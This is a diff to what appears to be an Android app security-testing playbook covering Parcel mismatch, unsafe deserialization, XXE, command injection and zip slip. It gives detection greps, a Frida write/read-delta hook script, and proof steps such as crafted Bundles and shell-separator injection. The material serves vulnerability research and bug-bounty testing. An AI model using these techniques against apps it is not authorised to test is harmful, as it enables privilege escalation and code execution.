 - **Test:** You do not need a public gadget library. The victim's own classes are on its classpath, so the
@@ -1708,22 +1786,23 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | | |
 |---|---|
 | **Severity ceiling** | Medium as a hardening gap; High when a crafted type reaches a sink |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) for the reachable case; hardening alone is P5 |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) for the reachable case; hardening alone is P5 |
 | **Attacker** | AM-03 |
 | **Applies to** | typed overloads exist from **API 33 (Android 13)**; **LEGACY** below that, where `BundleCompat`/`IntentCompat` are the available fix — so the untyped call is still a finding on any `targetSdk` |
+| **Requires** | device |
 | **Maps to** | `risks/unsafe-deserialization` — use `Intent.getParcelableExtra(String, Class<T>)`, `Intent.getParcelableArrayListExtra(String, Class<? extends T>)`, `Parcel.readParcelable(ClassLoader, Class<T>)`; "catches type mismatches before deserialization, preventing privilege escalation (e.g. CVE-2021-0928)"; michalbednarski/TheLastBundleMismatch — **CVE-2023-45777**, where the patch "adds the type parameter to the original call"; MASWE-0050 |
 
-- **Test:** The untyped overloads instantiate whatever class the `Parcel` names, using the supplied
+- **Test:** Canonical here — D08-028 and D08-032 point at this item for the untyped-getter gadget hunt. The untyped overloads instantiate whatever class the `Parcel` names, using the supplied
   `ClassLoader`, *before* any type check the app then performs. The typed API 33 overloads validate first.
   Code still using the untyped form on externally-sourced data keeps the type-confusion surface open — the
   exact gap CVE-2023-45777 exploited in `AccountManagerService`.
 - **How:**
   ```bash
-  grep -rnE 'getParcelable\(\s*[^,)]+\s*\)|getParcelableExtra\(\s*[^,)]+\s*\)|getParcelableArrayListExtra\(\s*[^,)]+\s*\)|getSerializable\(\s*[^,)]+\s*\)|getSerializableExtra\(\s*[^,)]+\s*\)|readParcelable\(\s*[^,)]+\s*\)' out/sources/ \
-    | grep -viE '^out/sources/(android|androidx)/'
+  grep -rnE 'getParcelable\(\s*[^,)]+\s*\)|getParcelableExtra\(\s*[^,)]+\s*\)|getParcelableArrayListExtra\(\s*[^,)]+\s*\)|getSerializable\(\s*[^,)]+\s*\)|getSerializableExtra\(\s*[^,)]+\s*\)|readParcelable\(\s*[^,)]+\s*\)' $DEC/jadx/sources/ \
+    | grep -viE '/(android|androidx|kotlin|kotlinx)/'
   # the safe forms name a class:
-  grep -rnE 'getParcelable\([^,]+,\s*[A-Za-z.]+(::class\.java|\.class)|IntentCompat\.getParcelableExtra|BundleCompat\.getParcelable' out/sources/
-  grep -rnE 'setClassLoader\(|BadParcelableException' out/sources/
+  grep -rnE 'getParcelable\([^,]+,\s*[A-Za-z.]+(::class\.java|\.class)|IntentCompat\.getParcelableExtra|BundleCompat\.getParcelable' $DEC/jadx/sources/
+  grep -rnE 'setClassLoader\(|BadParcelableException' $DEC/jadx/sources/
   ```
 - **Proof:** An untyped call on a `Bundle`/`Intent` originating from an exported component, a notification,
   a widget fill-in or a Wear message — plus a crafted Intent carrying a different `Parcelable` type for that
@@ -1740,12 +1819,14 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | | |
 |---|---|
 | **Severity ceiling** | High to Critical |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) for the app-level component-access bypass; `server_side_injection.remote_code_execution_rce` (P1) where the smuggled object reaches a code sink |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) for the app-level component-access bypass; `server_side_injection.remote_code_execution_rce` (P1) where the smuggled object reaches a code sink |
 | **Attacker** | AM-03 |
 | **Applies to** | all. API 33's typed read APIs mitigate the *type-confusion* variant but **not** a byte-count mismatch inside a class the app itself defines. Android 13's length-prefixed `LazyValue` limits *cascading* corruption but, per CVE-2023-45777, does not save code that deserializes without a type |
+| **Requires** | device |
 | **Maps to** | michalbednarski/ReparcelBug2 — **CVE-2021-0928** ("a `writeToParcel`/`createFromParcel` serialization mismatch in `OutputConfiguration`"), with the four detection signs: exception suppression in `createFromParcel`; untyped collections via `readList()` without a ClassLoader constraint; nested variable-length objects; mismatched field counts. michalbednarski/LeakValue — **CVE-2022-20452** ("privilege escalation … via LazyValue using Parcel after `recycle()`"), and **CVE-2022-20474**. michalbednarski/TheLastBundleMismatch — **CVE-2023-45777**. Also **CVE-2023-20963** (WorkSource parcel/unparcel mismatch, exploited in the wild per Project Zero's RCA), **CVE-2024-49744**, **CVE-2024-49746** (`Parcel::continueWrite` closing FDs later used), **CVE-2024-34740**, **CVE-2017-0806** (GateKeeperResponse), **CVE-2021-0748** (ParsingPackageImpl); Bundle Fengshui (Bundle magic `0x4C444E42`, length-prefixed lazy unparcel, AccountManagerService→Settings uid 1000 launchAnyWhere). Google's Android & Google Devices in-scope impact list names this explicitly: *"Deserialization & Gadget Chains: Viable gadget chains (e.g., Parcel Mismatch)"*. MASWE-0050 |
 
-- **Test:** It is the responsibility of a `Parcelable` implementation to ensure `createFromParcel` reads the
+- **Test:** Canonical here — D06-066 and D08-031 point at this item for the Parcel mismatch. It is the
+  responsibility of a `Parcelable` implementation to ensure `createFromParcel` reads the
   same number of bytes `writeToParcel` wrote. When they diverge — usually because `createFromParcel` has a
   try/catch that swallows an exception mid-read, or a field was added to the writer and not the reader —
   the unread bytes are interpreted as the **next** object. An attacker who controls one field smuggles a
@@ -1753,32 +1834,56 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 - **How:**
   ```bash
   # every app-defined Parcelable, with a crude write/read count per class
-  grep -rln 'implements Parcelable\|: Parcelable' out/sources/ | while read f; do
+  grep -rln 'implements Parcelable\|: Parcelable' $DEC/jadx/sources/ | while read f; do
     w=$(sed -n '/writeToParcel/,/^    }/p' "$f" | grep -cE 'write[A-Z][A-Za-z]*\(')
     r=$(sed -n '/createFromParcel/,/^        }/p;/protected .*(Parcel/,/^    }/p' "$f" | grep -cE 'read[A-Z][A-Za-z]*\(')
     [ "$w" != "$r" ] && echo "MISMATCH-CANDIDATE $f writes=$w reads=$r"
   done
   # the four warning signs
-  grep -rn -A25 'createFromParcel' out/sources/ | grep -nE 'catch\s*\(|readList\(|readParcelable\(|readBundle\(|readSerializable\('
+  grep -rn -A25 'createFromParcel' $DEC/jadx/sources/ | grep -nE 'catch\s*\(|readList\(|readParcelable\(|readBundle\(|readSerializable\('
   # does the app cross a process boundary at all?
-  grep -n 'android:process' out/AndroidManifest.xml
-  grep -rn 'multiprocess\|RemoteWorkManager\|RemoteListenableWorker\|androidx.work.multiprocess' out/sources/ out/AndroidManifest.xml
+  grep -n 'android:process' $DEC/apktool/AndroidManifest.xml
+  grep -rn 'multiprocess\|RemoteWorkManager\|RemoteListenableWorker\|androidx.work.multiprocess' $DEC/jadx/sources/ $DEC/apktool/AndroidManifest.xml
   ```
-  Instrument the deltas rather than trusting the grep count:
+  Instrument the deltas rather than trusting the grep count — over **every** app-defined Parcelable, list-driven
+  (Shell-Loop Ban: the summary count must equal the input count):
+  ```bash
+  grep -rlE 'implements Parcelable|: Parcelable' $DEC/jadx/sources/ | grep -vE '/(android|androidx|kotlin)/' \
+    | sed -E 's#.*/sources/##; s#\.java$##; s#/#.#g' | sort -u > parcelables.txt; wc -l parcelables.txt
+  frida -D "$SERIAL" -f com.target.app -t 600 -l parcel-delta.js | tee logs/D17-046.txt
+  ```
   ```javascript
+  // parcel-delta.js — hooks writeToParcel and CREATOR.createFromParcel for each FQCN in parcelables.txt
+  var CLASSES = File.readAllText('parcelables.txt').split('\n').filter(function (s) { return s.length; });
+  var W = {}, R = {};
   Java.perform(function () {
-    var C  = Java.use("com.target.app.model.Thing");
-    var CR = Java.use("com.target.app.model.Thing$1");     // the CREATOR
-    C.writeToParcel.implementation = function (p, f) {
-      var a = p.dataPosition(); this.writeToParcel(p, f);
-      console.log("write delta=" + (p.dataPosition() - a));
-    };
-    CR.createFromParcel.overload('android.os.Parcel').implementation = function (p) {
-      var a = p.dataPosition(); var r = this.createFromParcel(p);
-      console.log("read  delta=" + (p.dataPosition() - a)); return r;
-    };
+    var hooked = 0;
+    CLASSES.forEach(function (n) {
+      try {
+        var C = Java.use(n);
+        C.writeToParcel.overload('android.os.Parcel', 'int').implementation = function (p, f) {
+          var a = p.dataPosition(); this.writeToParcel(p, f); W[n] = p.dataPosition() - a; };
+        var cr = Java.cast(C.class.getField('CREATOR').get(null), Java.use('android.os.Parcelable$Creator'));
+        var CR = Java.use(cr.$className);
+        CR.createFromParcel.overload('android.os.Parcel').implementation = function (p) {
+          var a = p.dataPosition(); var r = this.createFromParcel(p); R[n] = p.dataPosition() - a; return r; };
+        hooked++;
+      } catch (e) { console.log('SKIP ' + n + ' ' + e); }
+    });
+    console.log('[parcel-delta] hooked=' + hooked + ' of ' + CLASSES.length);
   });
+  setTimeout(function () {                 // summary after the walkthrough (-t)
+    var mis = 0, seen = 0;
+    CLASSES.forEach(function (n) {
+      if (W[n] === undefined && R[n] === undefined) { console.log('UNEXERCISED ' + n); return; }
+      seen++; if (W[n] !== R[n]) { mis++; console.log('MISMATCH ' + n + ' write=' + W[n] + ' read=' + R[n]); }
+      else console.log('OK ' + n + ' write=' + W[n] + ' read=' + R[n]);
+    });
+    console.log('[parcel-delta] classes=' + CLASSES.length + ' exercised=' + seen + ' MISMATCH=' + mis);
+  }, 590000);
   ```
+  Drive every screen that round-trips app objects (saved state, cross-process calls, WorkManager) before the
+  timer fires. `File.readAllText` needs frida >= 16.4; on older tools inline the list.
 - **Proof:** Unequal write/read deltas for the same class (or `Parcel.dataPosition()` after
   `createFromParcel` differing from `dataSize()` in a harness), and then a crafted `Bundle` in which the
   validating code path observes key set `{a}` while the downstream component logs `{a, injected}` — print
@@ -1786,18 +1891,21 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 - **Escalation:** In an app context the payoff is usually forwarding a forged `Intent` past a check, i.e.
   D08 intent redirection with the validation defeated. Against platform code it is local privilege
   escalation — escalate to the platform/OEM VRP in addition to the app owner.
-- **Ruled out when:** Every app-defined `Parcelable` has matching write/read counts (verified by the
-  `dataPosition` harness, not by the grep), no `createFromParcel` swallows an exception, and the app never
-  forwards a `Bundle` it received across a process boundary.
+- **Ruled out when:** Every app-defined `Parcelable` exercised in the walkthrough shows equal write/read deltas
+  in `parcel-delta.js` (summary line `MISMATCH=0`, `exercised` stated against the class count), no
+  `createFromParcel` swallows an exception, and the app never forwards a `Bundle` it received across a process
+  boundary. Where a class is never exercised, say so and fall back to the write/read count grep plus the
+  `LazyValue` note, marking the row `partial`.
 
 ### D17-047 · A `Bundle` validated in one place and re-read in another
 
 | | |
 |---|---|
 | **Severity ceiling** | Critical when it crosses a privilege boundary; High within an app |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES); `broken_authentication_and_session_management.authentication_bypass` (P1) where the check being defeated is an auth check |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies); `broken_authentication_and_session_management.authentication_bypass` (P1) where the check being defeated is an auth check |
 | **Attacker** | AM-03 |
 | **Applies to** | all; the generalised rule is **any Bundle that is validated in one process and used in another** |
+| **Requires** | device |
 | **Maps to** | CVE-2023-45777 (the `bundle.getParcelable(KEY_INTENT)` without a type parameter; the patch is a one-token change to `bundle.getParcelable(KEY_INTENT, Intent.class)`); Bundle Fengshui; MASWE-0050 |
 
 - **Test:** The greppable corollary to D17-046. Find every place the app reads a value from an externally
@@ -1806,9 +1914,9 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   inside a security check; (3) any interaction with `Parcel.ReadWriteHelper` or the lazy-bundle machinery.
 - **How:**
   ```bash
-  grep -rnE 'getExtras\(\)' -A8 out/sources/ | grep -E 'putExtras|startActivity|sendBroadcast|\.send\(|bindService'
-  grep -rnE 'getParcelable\("[^"]+"\)|bundle\.get\(' out/sources/     # untyped read before a security decision
-  grep -rn 'setDefusable\|BadParcelableException\|ReadWriteHelper' out/sources/
+  grep -rnE 'getExtras\(\)' -A8 $DEC/jadx/sources/ | grep -E 'putExtras|startActivity|sendBroadcast|\.send\(|bindService'
+  grep -rnE 'getParcelable\("[^"]+"\)|bundle\.get\(' $DEC/jadx/sources/     # untyped read before a security decision
+  grep -rn 'setDefusable\|BadParcelableException\|ReadWriteHelper' $DEC/jadx/sources/
   ```
 - **Proof:** The receiving component acting on a different value than the validating component saw —
   instrument both sides and print the two values in the same capture.
@@ -1825,6 +1933,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) for the memory-corruption variant; `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) for the state-disclosure variant |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
+| **Requires** | device |
 | **Maps to** | Oversecured's `ParcelableJsonWrapper` class; `risks/unsafe-deserialization`; the known-gadget set `OpenSSLX509Certificate`, `VirtualRefBasePtr`, `MemoryIntArray`; MASWE-0050 |
 
 - **Test:** Code that parses attacker-controlled JSON into an **attacker-controlled `Class`** — Gson,
@@ -1833,10 +1942,10 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 - **How:**
   ```bash
   # the target Class is a VARIABLE, not a literal
-  grep -rnE 'fromJson\([^,]+,\s*[a-z][A-Za-z0-9_]*\)|readValue\([^,]+,\s*[a-z][A-Za-z0-9_]*\)|JSON\.parseObject\(' out/sources/
+  grep -rnE 'fromJson\([^,]+,\s*[a-z][A-Za-z0-9_]*\)|readValue\([^,]+,\s*[a-z][A-Za-z0-9_]*\)|JSON\.parseObject\(' $DEC/jadx/sources/
   # wrapper shape: a className/clazz/type field beside a jsonData/data field
-  grep -rnE 'className|clazz|"type"' -A6 out/sources/ | grep -nE 'jsonData|"data"|Class\.forName'
-  grep -rnE 'enableDefaultTyping|activateDefaultTyping|@JsonTypeInfo' out/sources/
+  grep -rnE 'className|clazz|"type"' -A6 $DEC/jadx/sources/ | grep -nE 'jsonData|"data"|Class\.forName'
+  grep -rnE 'enableDefaultTyping|activateDefaultTyping|@JsonTypeInfo' $DEC/jadx/sources/
   ```
   The two worked shapes:
   ```text
@@ -1860,9 +1969,10 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | | |
 |---|---|
 | **Severity ceiling** | High to Critical depending on gadget availability |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES); P1 with a gadget |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies); P1 with a gadget |
 | **Attacker** | AM-02 / AM-03 |
 | **Applies to** | all |
+| **Requires** | device |
 | **Maps to** | `risks/unsafe-deserialization`; Oversecured, *"Android: Access to app protected components"* ("exotic variants … casting byte arrays to Parcel objects and deserializing Intents directly"); MASWE-0050 |
 
 - **Test:** Beyond `Parcel` and `ObjectInputStream`: `Intent.parseUri(..., URI_INTENT_SCHEME)` on attacker
@@ -1870,9 +1980,9 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   `unmarshall(bytes, 0, len)` turns an arbitrary byte array into a Parcel the app then reads.
 - **How:**
   ```bash
-  grep -rnE 'Intent\.parseUri|URI_INTENT_SCHEME|URI_ANDROID_APP_SCHEME|URI_ALLOW_UNSAFE|Intent\.getIntent\(' -A6 out/sources/
-  grep -rnE 'Parcel\.obtain\(\)|\.unmarshall\(|setDataPosition\(' -A6 out/sources/
-  grep -rnE 'ObjectInputStream|enableDefaultTyping|@JsonTypeInfo' -A3 out/sources/
+  grep -rnE 'Intent\.parseUri|URI_INTENT_SCHEME|URI_ANDROID_APP_SCHEME|URI_ALLOW_UNSAFE|Intent\.getIntent\(' -A6 $DEC/jadx/sources/
+  grep -rnE 'Parcel\.obtain\(\)|\.unmarshall\(|setDataPosition\(' -A6 $DEC/jadx/sources/
+  grep -rnE 'ObjectInputStream|enableDefaultTyping|@JsonTypeInfo' -A3 $DEC/jadx/sources/
   ```
 - **Proof:** The sink reached from an exported component or a deep link, plus an object of an unexpected
   class materialising — log the runtime class from a Frida hook on the sink.
@@ -1886,9 +1996,10 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | | |
 |---|---|
 | **Severity ceiling** | High (it is the control whose absence makes D17-043 exploitable) |
-| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (VARIES) for the missing control; rate the chain at D17-043's node |
+| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies) for the missing control; rate the chain at D17-043's node |
 | **Attacker** | AM-03 |
-| **Applies to** | `java.io.ObjectInputFilter` is available on Android from **API 30**. Below that the control must be a manual `resolveClass` override — check for one |
+| **Applies to** | `java.io.ObjectInputFilter` / `ObjectInputStream.setObjectInputFilter` exist on Android from **API 33** (the OpenJDK 11 core-library uplift — check the `Added in API level` line before citing; `grep -n minSdkVersion "$DEC/apktool/apktool.yml"` first). Below that the control must be a manual `resolveClass` override — check for one |
+| **Requires** | device |
 | **Maps to** | `risks/unsafe-deserialization` (CVE-2014-7911 `ObjectInputStream`/Android < 5.0, the look-ahead `ObjectInputFilter` mitigation, and a `readObject` that throws) |
 
 - **Test:** A look-ahead filter rejects unexpected classes *before* they are instantiated. Its absence on a
@@ -1896,9 +2007,9 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   and "deserializes untrusted data safely".
 - **How:**
   ```bash
-  grep -rnE 'ObjectInputStream' -A10 out/sources/ | grep -nE 'setObjectInputFilter|ObjectInputFilter|resolveClass'
-  grep -rn 'setObjectInputFilter\|ObjectInputFilter\.Config' out/sources/
-  grep -n 'minSdkVersion' out/apktool.yml
+  grep -rnE 'ObjectInputStream' -A10 $DEC/jadx/sources/ | grep -nE 'setObjectInputFilter|ObjectInputFilter|resolveClass'
+  grep -rn 'setObjectInputFilter\|ObjectInputFilter\.Config' $DEC/jadx/sources/
+  grep -n 'minSdkVersion' $DEC/apktool/apktool.yml
   ```
 - **Proof:** An `ObjectInputStream` constructed over attacker-reachable bytes with no filter and no
   `resolveClass` override, plus a crash or behaviour change from a crafted stream naming a class the app
@@ -1915,6 +2026,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-03 |
 | **Applies to** | all; the detection rule is mechanical |
+| **Requires** | device |
 | **Maps to** | GitHub Security Lab's Android deserialization history — **CVE-2014-7911** (`BinderProxy` `mObject`/`mOrgue`), **CVE-2015-3825** (`OpenSSLX509Certificate.mContext`), `MemoryIntArray` (`mMemoryAddr`/`mOwnerPid`), **CVE-2017-0871** (`ParcelableException` invoking constructors via `Class.forName()` reflection); their detection rule: a `Serializable`/`Parcelable` class with a `finalize()` that calls a native method and a non-transient `long` pointer field |
 
 - **Test:** Search the app **and its dependencies** for the shape that made Android's historic
@@ -1923,9 +2035,9 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   an attacker-chosen pointer value is memory corruption without any traditional gadget chain.
 - **How:**
   ```bash
-  grep -rn -A30 'implements +\(java\.io\.\)\?Serializable' out/sources/ \
+  grep -rn -A30 'implements +\(java\.io\.\)\?Serializable' $DEC/jadx/sources/ \
     | grep -nE 'protected void finalize|native |long +m[A-Z][A-Za-z]*;'
-  grep -rn -A30 'implements Parcelable' out/sources/ \
+  grep -rn -A30 'implements Parcelable' $DEC/jadx/sources/ \
     | grep -nE 'protected void finalize|native |long +m[A-Z][A-Za-z]*;'
   ```
 - **Proof:** The class listing (fields + `finalize`), plus a tombstone from delivering an instance with a
@@ -1942,14 +2054,15 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) with all three; `using_components_with_known_vulnerabilities.outdated_software_version` (P5) if you file the version alone |
 | **Attacker** | AM-03 / AM-09 |
 | **Applies to** | jackson-databind on Android (uncommon, but present in enterprise/MDM/SDK code). The version cut-off that matters is **2.10**, which introduced "Safe Default Typing" requiring an allow list; 2.9.x and earlier used a deny list of ~90 classes across 30–40 libraries |
+| **Requires** | — |
 | **Maps to** | Jackson wiki *"Jackson Polymorphic Deserialization CVE Criteria"* — requires (a) the service accepts JSON from untrusted sources, (b) Default Typing enabled or an equivalent `@JsonTypeInfo` with `java.lang.Object` as base type, (c) gadget classes on the classpath; "these attacks do NOT work against default configuration of ObjectMapper". Family origin **CVE-2017-7525**; **CVE-2018-12022** (jodd-db gadget); **CVE-2020-36180** |
 
 - **Test:** Do not file a jackson gadget CVE on version alone. Prove the three conditions the maintainers
   themselves define.
 - **How:**
   ```bash
-  grep -rn 'enableDefaultTyping\|activateDefaultTyping\|DefaultTyping\.' out/sources/
-  grep -rn '@JsonTypeInfo' out/sources/ | grep -iE 'Id\.CLASS|MINIMAL_CLASS|use *= *JsonTypeInfo\.Id\.CLASS'
+  grep -rn 'enableDefaultTyping\|activateDefaultTyping\|DefaultTyping\.' $DEC/jadx/sources/
+  grep -rn '@JsonTypeInfo' $DEC/jadx/sources/ | grep -iE 'Id\.CLASS|MINIMAL_CLASS|use *= *JsonTypeInfo\.Id\.CLASS'
   grep -rn 'com.fasterxml.jackson' --include='*.gradle*' --include='*.toml' .
   ./gradlew :app:dependencies --configuration releaseRuntimeClasspath \
     | grep -iE 'c3p0|jodd|commons-dbcp|hibernate|logback|spring-|xalan|ehcache'
@@ -1970,6 +2083,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `using_components_with_known_vulnerabilities.outdated_software_version` (P5) without reachability; `application_level_denial_of_service_dos.*` if you can take a service down |
 | **Attacker** | AM-03 |
 | **Applies to** | Gson `< 2.8.9` |
+| **Requires** | — |
 | **Maps to** | **CVE-2022-25647 / GHSA-4jrv-ppp4-jm57** — `com.google.code.gson:gson`, all versions before **2.8.9** (covering 1.1–1.7.2 and 2.0–2.8.8), fixed in 2.8.9 (Gson PR #1991), CWE-502, CVSS 3.1 **7.7** (`AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:H`); mechanism: "Deserialization of Untrusted Data via the `writeReplace()` method in internal classes" |
 
 - **Test:** Establish the Gson version, then establish whether **Java serialization** of Gson internal types
@@ -1979,8 +2093,8 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   ```bash
   grep -rn "com.google.code.gson" --include='*.gradle*' --include='*.toml' .
   unzip -p target.apk 'META-INF/*.version' | grep -i gson
-  grep -rnE 'ObjectInputStream|readObject\(|Serializable' out/sources/ | grep -viE '^out/sources/(android|androidx)/' | head -40
-  grep -rnE 'getSerializableExtra|putSerializable' out/sources/ | grep -viE '^out/sources/(android|androidx)/'
+  grep -rnE 'ObjectInputStream|readObject\(|Serializable' $DEC/jadx/sources/ | grep -viE '/(android|androidx|kotlin|kotlinx)/' | head -40
+  grep -rnE 'getSerializableExtra|putSerializable' $DEC/jadx/sources/ | grep -viE '/(android|androidx|kotlin|kotlinx)/'
   ```
 - **Proof:** Gson `< 2.8.9` in the resolved graph **plus** a code path reading a
   `Serializable`/`ObjectInputStream` from an attacker source. Without the second half, report it as
@@ -1998,6 +2112,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.xml_external_entity_injection_xxe` (P1); the read primitive maps to `server_side_injection.file_inclusion.local` (P1) |
 | **Attacker** | AM-02 (a file or deep-link payload) / AM-03 / AM-09 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | `risks/xml-external-entities-injection`; MASTG-KNOW-0021 ("the true danger in XML lies in the XML eXternal Entity (XXE) attack as it might allow for reading external data sources that are still accessible within the application"); MASTG-TEST-0337; MASWE-0050; mobsfscan rules `xmlinputfactory_xxe`, `xmlinputfactory_xxe_enabled`, `xml_decoder_xxe`, `android_kotlin_xmlinputfactory_xxe`, `android_kotlin_xml_decoder_xxe` |
 
 - **Test:** XML parsers configured to resolve external entities on attacker-influenced input read local
@@ -2005,7 +2120,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   **no** hardening calls.
 - **How:**
   ```bash
-  grep -rnE 'DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|XmlPullParserFactory|TransformerFactory|XMLReader|XMLDecoder' -A12 out/sources/ \
+  grep -rnE 'DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|XmlPullParserFactory|TransformerFactory|XMLReader|XMLDecoder' -A12 $DEC/jadx/sources/ \
     | grep -vnE 'setFeature|setProperty|IS_SUPPORTING_EXTERNAL_ENTITIES|disallow-doctype-decl|external-general-entities|external-parameter-entities|setExpandEntityReferences|XMLConstants'
   ```
   Payload into whatever XML sink you found (a deep-link parameter, a provider write, an imported file, a
@@ -2031,6 +2146,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) with a shell; `insecure_os_firmware.command_injection` (P1) on an OEM/firmware target |
 | **Attacker** | AM-02 / AM-03 |
 | **Applies to** | all; "root helper" and device-control code first |
+| **Requires** | — |
 | **Maps to** | mobsfscan `command_injection`, `command_injection_warning` ("A formatted or concatenated string was detected as input to a …"), `android_kotlin_command_injection*`; MobSF `api_os_command`; MASWE-0050 |
 
 - **Test:** `Runtime.getRuntime().exec(String)` is **shell-less** — it splits on whitespace with no
@@ -2039,8 +2155,8 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   most common way a command-execution report gets closed.
 - **How:**
   ```bash
-  grep -rnE 'Runtime\.getRuntime\(\)\.exec|ProcessBuilder' -B8 -A4 out/sources/
-  grep -rnE 'exec\(' -B4 out/sources/ | grep -nE '\+|String\.format|format\(|\bsh\b|-c'
+  grep -rnE 'Runtime\.getRuntime\(\)\.exec|ProcessBuilder' -B8 -A4 $DEC/jadx/sources/
+  grep -rnE 'exec\(' -B4 $DEC/jadx/sources/ | grep -nE '\+|String\.format|format\(|\bsh\b|-c'
   ```
 - **Proof:** With a shell: an injected separator (`;`, `&&`, `$( )`) producing your command's side effect
   inside the app's UID (a file created under `/data/data/com.target.app/`). Without one: the flag or path
@@ -2054,10 +2170,11 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | | |
 |---|---|
 | **Severity ceiling** | **Critical** (code execution) / High (integrity) |
-| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when the write lands on code; `server_security_misconfiguration.path_traversal` (VARIES) for the write alone |
+| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when the write lands on code; `server_security_misconfiguration.path_traversal` (varies) for the write alone |
 | **Attacker** | AM-02 (the user imports an archive) / AM-03 (via a share intent or provider) / AM-09 |
 | **Applies to** | all. `java.util.zip` does **not** validate entry names. Platform protection only at **targetSdk ≥ 34** |
-| **Maps to** | `risks/zip-path-traversal` ("Applications that unzip archive files without sanitizing the target file paths … are susceptible to overwriting their internal files with attacker-provided files"; the fix is `getCanonicalPath().startsWith(targetPath.getCanonicalPath() + File.separator)`, whose absence is the bug); Google Play ASI campaigns **"Zipfile Path Traversal"** (started 2019-05-21) and **"Path Traversal"** (2017-09-22); **CVE-2020-8913** as the same class (`split_id` = `../verified-splits/config.test`); **CVE-2026-27704** (Dart/Flutter Pub extraction, see D17-071) |
+| **Requires** | — |
+| **Maps to** | `risks/zip-path-traversal` ("Applications that unzip archive files without sanitizing the target file paths … are susceptible to overwriting their internal files with attacker-provided files"; the fix is `getCanonicalPath().startsWith(targetPath.getCanonicalPath() + File.separator)`, whose absence is the bug); Google Play ASI campaigns **"Zipfile Path Traversal"** (started 2019-05-21) and **"Path Traversal"** (2017-09-22); **CVE-2020-8913** as the same class (`split_id` = `../verified-splits/config.test`); **CVE-2026-27704** (Dart/Flutter Pub extraction, see D17-074) |
 
 - **Test:** Any extraction loop that concatenates `entry.getName()` onto a base directory without canonical
   validation writes outside that directory. Whenever you find one, the next question is *where to land it*.
@@ -2069,10 +2186,10 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
      flag without any code execution at all.
 - **How:**
   ```bash
-  grep -rnE 'ZipInputStream|ZipFile|ZipEntry|getNextEntry\(|TarArchiveInputStream' -A20 out/sources/ \
+  grep -rnE 'ZipInputStream|ZipFile|ZipEntry|getNextEntry\(|TarArchiveInputStream' -A20 $DEC/jadx/sources/ \
     | grep -nE 'getName\(\)' -A6 | grep -vnE 'getCanonicalPath|startsWith|normalize\(\)'
   # third-party unzip helpers are frequently vulnerable too
-  grep -rn 'net.lingala.zip4j\|org.apache.commons.compress\|unzip' out/sources/ | head
+  grep -rn 'net.lingala.zip4j\|org.apache.commons.compress\|unzip' $DEC/jadx/sources/ | head
   ```
   ```python
   import zipfile
@@ -2097,19 +2214,20 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | | |
 |---|---|
 | **Severity ceiling** | High (it re-enables zip slip process-wide) |
-| **VRT** | `server_security_misconfiguration.path_traversal` (VARIES) → `server_side_injection.remote_code_execution_rce` (P1) chained |
+| **VRT** | `server_security_misconfiguration.path_traversal` (varies) → `server_side_injection.remote_code_execution_rce` (P1) chained |
 | **Attacker** | AM-02 / AM-03 |
 | **Applies to** | targetSdk ≥ 34 — below 34 there is nothing to opt out of and the class is fully live anyway (LEGACY) |
-| **Requires** | targetsdk>=34, legacy |
+| **Requires** | targetsdk>=34 |
 | **Maps to** | `about/versions/14/behavior-changes-14` — `ZipFile(String)` and `ZipInputStream.getNextEntry()` throw `ZipException` for entries containing `".."` or starting with `"/"`, with `dalvik.system.ZipPathValidator.clearCallback()` as the documented opt-out; `risks/zip-path-traversal` (MASVS-STORAGE) |
 
-- **Test:** Its presence in a 34+ app means a developer deliberately turned the mitigation off — usually
+- **Test:** Cross-reference: D22-034 owns the `ZipPathValidator.clearCallback()` gate — cite it here and keep only
+  the D17-056 consequence. Its presence in a 34+ app means a developer deliberately turned the mitigation off — usually
